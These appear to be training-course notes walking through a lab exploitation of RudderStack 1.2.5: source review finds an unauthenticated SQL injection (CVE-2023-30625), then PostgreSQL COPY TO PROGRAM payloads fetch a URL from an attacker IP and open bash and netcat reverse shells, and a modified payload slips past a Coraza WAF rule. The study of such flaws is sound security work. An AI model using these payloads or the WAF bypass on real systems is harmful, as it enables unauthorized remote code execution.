# RudderStack SQLi and Coraza WAF Bypass
In this module we analyzed the source code of RudderStack, a Go-based application, to identify unauthenticated API endpoints. After discovering one, we exploited a SQL injection vulnerability. We then tested the same exploit against a Web Application Firewall (WAF), adapting our payload to bypass its rules and highlighting the limitations of WAF protection.

## Getting Started 
The RudderStack VM uses Docker to run RudderStack and OWASP Coraza WAF in containers. We can access RudderStack through the Coraza WAF on port `80`. We can also access RudderStack directly on port `8080`. We'll be connecting on both ports as we examine how the WAF interacts with the vulnerability.

We can retrieve a list of the running Docker containers by running `docker` with the `ps` command.
```bash
student@rudderstack:~$ docker ps 
CONTAINER ID   IMAGE                                   COMMAND                  CREATED         STATUS                   PORTS                                                           NAMES
e79560abca80   student_caddy                           "/usr/bin/caddy run …"   3 minutes ago   Up 3 minutes             443/tcp, 0.0.0.0:80->80/tcp, :::80->80/tcp, 2019/tcp, 443/udp   student_caddy_1
9526a6198f87   rudderlabs/rudder-server:1.2.5          "sh -c '/wait-for db…"   3 minutes ago   Up 3 minutes             0.0.0.0:8080->8080/tcp, :::8080->8080/tcp                       student_backend_1
0a8d88671ac6   rudderstack/rudder-transformer:latest   "/sbin/tini -- npm s…"   3 minutes ago   Up 3 minutes (healthy)   127.0.0.1:9090->9090/tcp                                        student_d-transformer_1
5bb0f9d91064   postgres:15-alpine                      "docker-entrypoint.s…"   3 minutes ago   Up 3 minutes             0.0.0.0:6432->5432/tcp, :::6432->5432/tcp                       student_db_1
a945e7ac5d11   prom/statsd-exporter:v0.22.4            "/bin/statsd_exporter"   3 minutes ago   Up 3 minutes (healthy)   127.0.0.1:9102->9102/tcp, 9125/tcp, 9125/udp                    student_metrics-exporter_1
student@rudderstack:~$
```
While there are several containers running, we only need to be aware of `student_caddy_1`, `student_backend_1`, and `student_db_1` for this module.

If we want to inspect the contents of a container, we could run the following command:
```bash
student@rudderstack:~$ docker exec -it student_db_1 /bin/sh
/ #
```
## RudderStack SQL Injection Vulnerability
Our VM is running RudderStack `v1.2.5`, which contains a SQL injection vulnerability identified by the GitHub Security Lab and documented as `CVE-2023-30625`.

Rather than working off of the CVE write up, we'll perform our own source code analysis to enumerate the application's unauthenticated endpoints and discover the SQL injection vulnerability.

### Discovering the SQL Injection Vulnerability
We'll analyze the application as an **unauthenticated user**, starting by **enumerating API endpoints** and identifying which require authentication. RudderStack's **[official API documentation](https://www.rudderstack.com/docs/api/)**, found online, reveals that it uses **URL versioning** for its endpoints.

If we want to discover all the endpoints in the application's source code, we can search for variations of `"/v1"`, `"/v2"`, and so on.

We'll click on the *Search* icon in code-server, then click on the ellipsis to toggle additional search details.

We want to find strings that match the expected endpoint format, so we'll type `/v1` in the *Search* field. We'll limit our search to source files by typing `*.go` in the `"files to include"` field. We'll exclude any test files, since they will likely contain duplicate results, by typing `*_test.go` in the `"files to exclude"` field.

We have `40` results in `9` files. The first three results contain `Sprintf` calls that are constructing URL paths. After that, we'll notice multiple results in `gateway.go` containing strings that appear to be API paths passed to a `HandleFunc()` function. Let's analyze the start of the `StartWebHandler()` function, which contains most of the search results in `gateway.go`.

```go
1417  /*
1418  StartWebHandler starts all gateway web handlers, listening on gateway port.
1419  Supports CORS from all origins.
1420  This function will block.
1421  */
1422  func (gateway *HandleT) StartWebHandler(ctx context.Context) error {
1423  	gateway.logger.Infof("WebHandler waiting for BackendConfig before starting on %d", webPort)
1424  	gateway.backendConfig.WaitForConfig(ctx)
1425  	gateway.logger.Infof("WebHandler Starting on %d", webPort)
1426  
1427  	srvMux := mux.NewRouter()
1428  	srvMux.Use(
1429  		middleware.StatMiddleware(ctx, srvMux),
1430  		middleware.LimitConcurrentRequests(maxConcurrentRequests),
1431  	)
1432  	srvMux.HandleFunc("/v1/batch", gateway.webBatchHandler).Methods("POST")
1433  	srvMux.HandleFunc("/v1/identify", gateway.webIdentifyHandler).Methods("POST")
1434  	srvMux.HandleFunc("/v1/track", gateway.webTrackHandler).Methods("POST")
```
Source code excerpt of `StartWebHandler()` function

This code snippet explains how a web application sets up its HTTP endpoints. It uses the Gorilla Mux router (a popular Go library) to map specific URL paths to their corresponding handler functions. The `srvMux` object registers each route using `HandleFunc()`, so when a request comes in - like a `POST` to `"/v1/batch"` - the router automatically directs it to the appropriate handler function (`gateway.webBatchHandler` in this example). Essentially, it's the routing system that determines which code runs based on the incoming request's URL and HTTP method.

Identifying this function gives us URLs to test and shows which handlers to review. Instead of analyzing each one, we’ll use **Burp Suite** to quickly check which endpoints require authentication.

Let's get the list of potential URLs out of code-server by right-clicking on the search results and selecting `Copy All`. We'll then paste the results into a text file named `routes.txt` using our text editor of choice.

Unfortunately, the pasted results include line numbers and source files, so we don't have a clean list of URLs to pass to another tool or script.
```go
kali@kali:~$ head routes.txt
/home/student/rudder-server-1.2.5/cmd/devtool/commands/event.go
  60,24:        url := fmt.Sprintf("%s/v1/batch", c.String("endpoint"))

/home/student/rudder-server-1.2.5/config/backend-config/namespace_config.go
  84,35:        u.Path = fmt.Sprintf("/data-plane/v1/namespaces/%s/config", nc.Namespace)

/home/student/rudder-server-1.2.5/gateway/gateway.go
  989,24:       uri := fmt.Sprintf(`%s/v1/warehouse/pending-events?triggerUpload=true`, misc.GetWarehouseURL())
  1432,21:      srvMux.HandleFunc("/v1/batch", gateway.webBatchHandler).Methods("POST")
  1433,21:      srvMux.HandleFunc("/v1/identify", gateway.webIdentifyHandler).Methods("POST")
```
we can clean up most of the list using:
```bash
kali@kali:~$ grep -e "/v" routes.txt | cut -d "(" -f 2 | cut -d "," -f 1 | cut -d "\"" -f 2
%s/v1/batch
/data-plane/v1/namespaces/%s/config
`%s/v1/warehouse/pending-events?triggerUpload=true`
/v1/batch
/v1/identify
/v1/track
/v1/page
/v1/screen
/v1/alias
...
```
Let's redirect the results to a new file named routes_clean.txt. We'll also sort the results so we can check for duplicate URLs.
```bash
kali@kali:~$ grep -e "/v" routes.txt | cut -d "(" -f 2 | cut -d "," -f 1 | cut -d "\"" -f 2 | sort > routes_clean.txt
```
We’ll clean up the URLs by removing backticks (`` ` ``), format markers (`%s`), and `localhost` references to make them relative. For placeholders like `job_run_id`, we’ll replace them with `web300`.

Final version: [routes_clean.txt](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/RudderStack/routes_clean.txt)

Now that we have our list, we'll use Burp Suite to send requests to every endpoint. After opening Burp Suite, let's open the embedded browser and navigate to `http://rudderstack:8080/` so that we have a request that we can send to *Intruder*.

We want to send a request to each endpoint, so we'll need to add a payload marker (`§`) over the forward slash (`/`) on line one of the request. Each route also has an associated HTTP method. If we send a `GET` request to an endpoint that only handles `POST` requests, we might miss a valid API call. At the same time, fuzzing API endpoints with unexpected HTTP methods could also help us discover edge cases or bugs in the system. For those reasons, we'll also add a payload marker over `GET` on line one.

```text
§GET§ §/§ HTTP/1.1
Host: rudderstack:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0


```

For our attack type, we'll select ***Cluster bomb***. We want to test all combinations of HTTP methods and URL paths. Let's move on to configuring the *Payloads*.
- **For payload set 1**, we can use a `"Simple list"`. We'll add `"GET"` and `"POST"` to the list.
- **For payload set 2**, we'll also use a `"Simple list"`. Let's click on `Load...`, then select `routes_clean.txt`. We want the slashes in our payload list to be sent as-is, rather than URL-encoded, so we'll need to scroll down and **uncheck `" [X] URL-encode these characters"`**.

With everything set, we're ready to click `Start attack`. 

Using the built-in sorting options in Intruder attack results is a good way for us to analyze the results and identify differences and similarities in the responses. Let's sort the results ascending by status code. One of the first results is an HTTP `400` response for a `POST` request to `/v1/warehouse/pending-events?triggerUpload=true`.

The response body is `can't unmarshall body`. This is interesting since unmarshalling is the process of converting data from one format to another, such as XML to an in-memory object. Let's make note of this request and response and send the request to *Repeater* for further testing.

Most of the other responses are `404`s or include some variation of `Failed to read writeKey`. This latter message may be tied to an API key or some form of authentication. If we sort the *Intruder* results by *Length*, we'll find **six** responses with a length of `195` that all include `can't unmarshall body` in the response.

Let's send all six to *Repeater* so that we can keep track of them if we close the *Intruder* window.

Our next step is to review the application's source code to determine what `content-type` we need to send on these requests. We'll return to our IDE and review `gateway.go`.
```go
1462  srvMux.HandleFunc("/v1/pending-events", WithContentType("application/json; charset=utf-8", gateway.pendingEventsHandler)).Methods("POST")
1463  srvMux.HandleFunc("/v1/failed-events", WithContentType("application/json; charset=utf-8", gateway.fetchFailedEventsHandler)).Methods("POST")
1464  srvMux.HandleFunc("/v1/warehouse/pending-events", gateway.whProxy.ServeHTTP).Methods("POST")
1465  srvMux.HandleFunc("/v1/clear-failed-events", gateway.clearFailedEventsHandler).Methods("POST")
```
Line `1464` doesn't declare a content type for the `/v1/warehouse/pending-events` handler, unlike lines `1462` and `1463`, which set the expected content type as JSON. Since the majority of the other endpoints use JSON, we can try modifying our request to send JSON.

In *Repeater*, let's add `Content-Type: application/json` to our request, a placeholder JSON body, and then click `Send`.
```text
POST /v1/warehouse/pending-events?triggerUpload=true HTTP/1.1
Host: rudderstack:8080
Content-Type: application/json
Content-Length: 2

{}
```
This time the application responded with `empty source id`:
```text
HTTP/1.1 400 Bad Request
Content-Length: 16
Content-Type: text/plain; charset=utf-8
Date: Thu, 31 Jul 2025 18:12:25 GMT
Vary: Origin
X-Content-Type-Options: nosniff

empty source id

```
Let's search for that string (`empty source id`) in our IDE.

We receive **three** results in **two** files. The results in `warehouse.go` seem promising, as one of them includes `"pending-events"`. Let's click on the second result and analyze the source code.
```go
1673	// unmarshall body
1674	var pendingEventsReq warehouseutils.PendingEventsRequestT
1675	err = json.Unmarshal(body, &pendingEventsReq)
1676	if err != nil {
1677		pkgLogger.Errorf("[WH]: Error unmarshalling body: %v", err)
1678		http.Error(w, "can't unmarshall body", http.StatusBadRequest)
1679		return
1680	}
1681  
1682	sourceID := pendingEventsReq.SourceID
1683
1684	// return error if source id is empty
1685	if sourceID == "" {
1686		pkgLogger.Errorf("[WH]: pending-events:  Empty source id")
1687		http.Error(w, "empty source id", http.StatusBadRequest)
1688		return
1689	}
```
We've found the two error messages we've received so far. Line `1682` defines the `sourceID` variable. Since our request does not contain the necessary value, the `if` statement on line `1685` evaluates as `true` and we receive the error message from line `1687`.

We need to determine the proper value we need to include in our JSON body to control the value of `pendingEventsReq.SourceID`. The code declares the type of `pendingEventsReq` as `warehouseutils.PendingEventsRequestT` on line `1674`.

If we search in our IDE for `"PendingEventsRequestT"`, we can find it declared as a `struct` in `warehouse/utils/utils.go` on lines `321` through `324`.

```go
321  type PendingEventsRequestT struct {
322    SourceID  string `json:"source_id"`
323    TaskRunID string `json:"task_run_id"`
324  }
```

Based on this source code, we'll need to include `source_id` and `task_run_id` in the JSON body. Let's return to *Repeater* in Burp Suite and update our request body to include these keys. We'll set the value of each to `"1"` for now. After updating the request, let's click *Send*.
```text
POST /v1/warehouse/pending-events?triggerUpload=true HTTP/1.1
Host: rudderstack:8080
Content-Type: application/json
Content-Length: 43

{
"source_id": "1",
"task_run_id": "1"
}
```
Reponse received:
```
HTTP/1.1 200 OK
Content-Length: 70
Content-Type: text/plain; charset=utf-8
Date: Thu, 31 Jul 2025 19:33:25 GMT
Vary: Origin

{"pending_events":false,"pending_staging_files":0,"pending_uploads":0}
```
The application responded with HTTP `200 OK`, meaning we were able to call the API endpoint **without authentication**. Let's return to our IDE to determine what we can do with this endpoint. We'll continue analyzing the `pendingEventsHandler()` function in `warehouse.go`, starting on line `1691`.
```go
1691  pendingEvents := false
1692  var pendingStagingFileCount int64
1693  var pendingUploadCount int64
1694  
1695  // check whether there are any pending staging files or uploads for the given source id
1696  // get pending staging files
1697  pendingStagingFileCount, err = getPendingStagingFileCount(sourceID, true)
1698  if err != nil {
1699      err := fmt.Errorf("error getting pending staging file count : %v", err)
1700      pkgLogger.Errorf("[WH]: %v", err)
1701      http.Error(w, err.Error(), http.StatusInternalServerError)
1702      return
1703  }
```
Line `1697` passes the `sourceID` value to the `getPendingStagingFileCount()` function. We can find that function starting on line `1777` in the same file.
```go
1777  func getPendingStagingFileCount(sourceOrDestId string, isSourceId bool) (fileCount int64, err error) {
1778      sourceOrDestColumn := ""
1779      if isSourceId {
1780          sourceOrDestColumn = "source_id"
1781      } else {
1782          sourceOrDestColumn = "destination_id"
1783      }
1784      var lastStagingFileIDRes sql.NullInt64
1785      sqlStatement := fmt.Sprintf(`
1786          SELECT 
1787            MAX(end_staging_file_id) 
1788          FROM 
1789            %[1]s 
1790          WHERE 
1791            %[1]s.%[3]s = '%[2]s';
1792  `,
1793          warehouseutils.WarehouseUploadsTable,
1794          sourceOrDestId,
1795          sourceOrDestColumn,
1796      )
1797  
1798      err = dbHandle.QueryRow(sqlStatement).Scan(&lastStagingFileIDRes)
```
This creates a SQL statement on lines `1785` through `1796`, using `Sprintf()`. The function writes the `sourceOrDestId` value into the SQL statement. While this string formatting approach may seem similar to a parameterized query, it is not, and **does not offer any of the protections against SQL injection**. The code creates the `sqlStatement`, inserting the user-supplied value in the `sourceOrDestId` in the `WHERE` clause. Line `1798` then executes the SQL statement. Since the code writes the variables on lines `1793` through `1795` into the `sqlStatement` through string formatting, they are not passed as parameters to the `dbHandle.QueryRow()` function.

Since we can control the value of `sourceOrDestId` from our unauthenticated request, we should be able to exploit this SQL injection vulnerability. We'll explore the exploitation technique in the next section.

### Exploiting the SQL Injection Vulnerability
Let's verify that we can manipulate the SQL query. In *Repeater*, we'll update the `source_id` value to include a single quote (`'`) and then *Send* the request.
```text
POST /v1/warehouse/pending-events?triggerUpload=true HTTP/1.1
Host: rudderstack:8080
Content-Type: application/json
Content-Length: 43

{
"source_id": "'",
"task_run_id": "1"
}
```
Response received:
```text
HTTP/1.1 500 Internal Server Error
Content-Length: 227
Content-Type: text/plain; charset=utf-8
Date: Thu, 31 Jul 2025 19:40:15 GMT
Vary: Origin
X-Content-Type-Options: nosniff

error getting pending staging file count : query: 
		SELECT 
		  MAX(end_staging_file_id) 
		FROM 
		  wh_uploads 
		WHERE 
		  wh_uploads.source_id = ''';
 failed with Error : pq: unterminated quoted string at or near "''';
"
```
Since we have access to the source code, we can easily determine that the application uses PostgreSQL by reviewing the `setupDB()` function, which starts on line `2066` of `warehouse.go`.
```go
func setupDB(ctx context.Context, connInfo string) error {
	if isStandAloneSlave() {
		return nil
	}

	var err error
	dbHandle, err = sql.Open("postgres", connInfo)
	if err != nil {
		return err
	}
...
}
```
We could also consult the application's online documentation. In a black box assessment scenario, we could research the error message online to determine the database.

Since our injection point is at the end of the SQL statement and we are dealing with a PostgreSQL database, we have the ability to inject stacked queries. 

We've confirmed the SQL injection vulnerability. Now, let's consider using PostgreSQL's `COPY` command, which can read from or write to local files if the user has the `pg_read_server_files` or `pg_write_server_files` roles. **While this isn't useful here, it can be valuable if the web app and database share the same server**.

The `COPY` command can also copy data to or from a program or command if the database user has the `pg_execute_server_program role`. If the exploited database user has this permission, we have many options available for remote code execution. Verbose error messages may also disclose when an injection payload fails due to a lack of permissions.

Let's try using `COPY` to call `wget` and send a request back to our VM. First, we'll set up an HTTP server with Python to handle the request.
```bash
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
Next, we'll update the `source_id` in *Repeater* to `'; copy (select 'a') to program 'wget -q http://192.168.45.203:80/it_worked' -- -`:
```text
POST /v1/warehouse/pending-events?triggerUpload=true HTTP/1.1
Host: rudderstack:8080
Content-Type: application/json
Content-Length: 102

{
"source_id": "'; copy (select 'a') to program 'wget -q http://192.168.45.203:80/it_worked' -- -"
}
```
The application responded with an error, indicating that wget failed. However, if we check our HTTP server, the server did send a request.
```bash
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.130.144 - - [31/Jul/2025 16:05:49] code 404, message File not found
192.168.130.144 - - [31/Jul/2025 16:05:49] "GET /it_worked HTTP/1.1" 404 -

```
We were able to use the SQL injection vulnerability to run a command on the server. From here, we should be able to get a reverse shell on the server.
```text
POST /v1/warehouse/pending-events?triggerUpload=true HTTP/1.1
Host: rudderstack:8080
Content-Type: application/json
Content-Length: 114

{
"source_id": "'; copy (select 'a') to program 'bash -c \"bash -i >& /dev/tcp/192.168.45.203/1337 0>&1\"' -- -"
}
```
Let's check our Netcat listener:
```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.45.203] from (UNKNOWN) [192.168.130.144] 33746
bash: cannot set terminal process group (85): Not a tty
bash: no job control in this shell
5bb0f9d91064:~/data$ id
id
uid=70(postgres) gid=70(postgres) groups=70(postgres),70(postgres)
5bb0f9d91064:~/data$ 
```
We now have a reverse shell.

**Automation script:** [rce_script_noWAFbypass.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/RudderStack/rce_script_noWAFbypass.py)
## Bypassing a Web Application Firewall
Let's try sending our SQL injection payload through the WAF. As a reminder, we're using the following JSON body as our proof of concept:
```json
{ "source_id":"'; copy (select 'a') to program 'wget -q http://192.168.45.203:1337/it_worked' -- - ", "task_run_id":"1"}
```
We receive:
```text
HTTP/1.1 403 Forbidden
Server: Caddy
Date: Fri, 01 Aug 2025 01:10:30 GMT
Content-Length: 0


```
The application responded with HTTP `403 Forbidden` with a `Content-Length` of `0`. This response does not give us a lot to work with. Checking for different responses based on the values we send is one way we can attempt to identify if an application is behind a WAF. For example, if we send a single quote (`` ` ``) as the `source_id`, the application responds with an HTTP `500 Internal Server Error` with the verbose error message.

However, if we include a single quote (`'`) followed by a semicolon (`';`), we receive the empty `403 Forbidden` response. This difference in response may be all that we have to identify that we're interacting with a WAF.

Since we do have full access to the testing environment, let's review the Caddy logs to determine which rule we triggered.

```
student@rudder:~$ docker logs -n 5 student_caddy_1
{"level":"debug","ts":1709242735.4946961,"logger":"http.handlers.reverse_proxy","msg":"selected upstream","dial":"backend:8080","total_upstreams":1}
{"level":"debug","ts":1709242735.4958072,"logger":"http.handlers.reverse_proxy","msg":"upstream roundtrip","upstream":"backend:8080","duration":0.001060348,"request":{"remote_ip":"192.168.48.2","remote_port":"61683","client_ip":"192.168.48.2","proto":"HTTP/1.1","method":"POST","host":"rudderstack:80","uri":"/v1/warehouse/pending-events?triggerUpload=true","headers":{"Content-Length":["42"],"Accept-Encoding":["gzip, deflate, br"],"X-Forwarded-For":["192.168.48.2"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36"],"Accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],"X-Forwarded-Proto":["http"],"Upgrade-Insecure-Requests":["1"],"Content-Type":["application/json"],"Accept-Language":["en-US,en;q=0.9"],"X-Forwarded-Host":["rudderstack:80"]}},"headers":{"Vary":["Origin"],"X-Content-Type-Options":["nosniff"],"Content-Length":["227"],"Content-Type":["text/plain; charset=utf-8"],"Date":["Thu, 29 Feb 2024 21:38:55 GMT"]},"status":500}
{"level":"error","ts":1709242946.2066061,"logger":"http.handlers.waf","msg":"[client \"192.168.48.2\"] Coraza: Warning. SQL Authentication bypass (split query) [file \"/ruleset/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf\"] [line \"9227\"] [id \"942540\"] [rev \"\"] [msg \"SQL Authentication bypass (split query)\"] [data \"Matched Data: '; found within ARGS:json.source_id: ';\"] [severity \"critical\"] [ver \"OWASP_CRS/4.0.1-dev\"] [maturity \"0\"] [accuracy \"0\"] [tag \"application-multi\"] [tag \"language-multi\"] [tag \"platform-multi\"] [tag \"attack-sqli\"] [tag \"OWASP_CRS\"] [tag \"capec/1000/152/248/66\"] [tag \"PCI/6.5.2\"] [tag \"paranoia-level/1\"] [hostname \"\"] [uri \"/v1/warehouse/pending-events?triggerUpload=true\"] [unique_id \"DqHmPboMoGeARJPm\"]"}
{"level":"error","ts":1709242946.2070546,"logger":"http.handlers.waf","msg":"[client \"192.168.48.2\"] Coraza: Access denied (phase 2). Inbound Anomaly Score Exceeded (Total Score: 5) [file \"/ruleset/rules/REQUEST-949-BLOCKING-EVALUATION.conf\"] [line \"11422\"] [id \"949110\"] [rev \"\"] [msg \"Inbound Anomaly Score Exceeded (Total Score: 5)\"] [data \"\"] [severity \"emergency\"] [ver \"OWASP_CRS/4.0.1-dev\"] [maturity \"0\"] [accuracy \"0\"] [tag \"anomaly-evaluation\"] [hostname \"\"] [uri \"/v1/warehouse/pending-events?triggerUpload=true\"] [unique_id \"DqHmPboMoGeARJPm\"]"}
{"level":"debug","ts":1709242946.2072287,"logger":"http.log.error","msg":"interruption triggered","request":{"remote_ip":"192.168.48.2","remote_port":"61800","client_ip":"192.168.48.2","proto":"HTTP/1.1","method":"POST","host":"rudderstack:80","uri":"/v1/warehouse/pending-events?triggerUpload=true","headers":{"Accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],"Accept-Language":["en-US,en;q=0.9"],"Upgrade-Insecure-Requests":["1"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36"],"Accept-Encoding":["gzip, deflate, br"],"Connection":["keep-alive"],"Content-Type":["application/json"],"Content-Length":["43"]}},"duration":0.003618809,"status":403,"err_id":"DqHmPboMoGeARJPm","err_trace":""}
student@rudder:~$ 
```
The logs indicate our attack triggered the `"SQL Authentication bypass (split query)"` rule, which can be found in `/ruleset/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf`. We'll analyze this file in the next section to understand how the rule works.

### Analyzing the WAF Ruleset
We can find `REQUEST-942-APPLICATION-ATTACK-SQLI.conf` in `/home/student/caddy/ruleset/rules/`. To review the file in code-server, we can browse to `http://rudderstack:8000/?folder=/home/student/caddy` and open the relevant directories. After searching for `"SQL Authentication bypass (split query)"`, we can find the relevant rule starting on line `547`.

```
# This rule catches an authentication bypass via SQL injection that abuses semi-colons to end the SQL query early.
# Any characters after the semi-colon are ignored by some DBMSes (e.g. SQLite).
#
# An example of this would be:
#   email=admin%40juice-sh.op';&password=foo
#
# The server then turns this into:
#   SELECT * FROM users WHERE email='admin@juice-sh.op';' AND password='foo'
#
# Regular expression generated from regex-assembly/942540.ra.
# To update the regular expression run the following shell script
# (consult https://coreruleset.org/docs/development/regex_assembly/ for details):
#   crs-toolchain regex update 942540
#
SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "@rx ^(?:[^']*'|[^\"]*\"|[^`]*`)[\s\v]*;" \
    "id:942540,\
    phase:2,\
    block,\
    capture,\
    t:none,t:urlDecodeUni,t:replaceComments,\
    msg:'SQL Authentication bypass (split query)',\
    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-sqli',\
    tag:'OWASP_CRS',\
    tag:'capec/1000/152/248/66',\
    tag:'PCI/6.5.2',\
    tag:'paranoia-level/1',\
    ver:'OWASP_CRS/4.0.0-rc2',\
    severity:'CRITICAL',\
    setvar:'tx.sql_injection_score=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
```
In this case, it uses a string that starts with `"@rx"` to denote a regular expression. The WAF engine will use this regex when it inspects a request. Although the regular expression in this rule may seem complex, it's essentially checking for a closing quote (`'`) followed by a semicolon (`;`). The comments on this rule aren't entirely accurate with regard to why attackers use semicolons. The example payload we've been working with uses a semicolon to create stacked queries. PostgreSQL, MySQL, and Microsoft SQL Server will execute multiple SQL statements if passed a single string of semicolon-separated queries.

### Bypassing the WAF
Since the regular expression checks for a single quote followed by a semicolon, we need to update our payload. We don't care about the SQL statement we're injecting into, so we can modify that part of our payload in any number of ways.

We could add a number comparison after the single quote and before the semicolon. This would separate the single quote and semicolon. The exact value we use before the semicolon doesn't matter as long as it's valid SQL syntax. The outcome of the first SQL statement does not impact the outcome of the stacked or secondary SQL statement, as long as it does not generate a syntax error.

We'll use the following JSON body:
```json
{ "source_id":"' or 1=2; copy (select 'a') to program 'wget -q http://192.168.45.203:80/it_will_bypass' -- - ", "task_run_id":"1"}
```
We can use an online tool like [regex101](https://regex101.com/) to test if the rule's regular expression matches our payload. When testing the regular expression, we don't need to include `"@rx"` since that is part of the SecRule definition, not the regular expression.

Based on the output from regex101, our payload should not be caught by the regular expression. There might be additional WAF rules that we aren't aware of, but let's try sending our updated payload. We'll need to start an HTTP server if we don't already have one running.

We received an error from the server, but the WAF did not block our request. Let's check our HTTP server.
```bash
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.130.144 - - [31/Jul/2025 21:27:28] code 404, message File not found
192.168.130.144 - - [31/Jul/2025 21:27:28] "GET /it_will_bypass HTTP/1.1" 404 -

```

#### Reverse Shell
```json
{ "source_id":"' or 1=2; copy (select 'a') to program 'busybox nc 192.168.45.203 1337 -e sh' -- - ", "task_run_id":"1"}
```
Netcat listener:
```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.45.203] from (UNKNOWN) [192.168.130.144] 37067
id
uid=70(postgres) gid=70(postgres) groups=70(postgres),70(postgres)

```
**Automation Script:** 
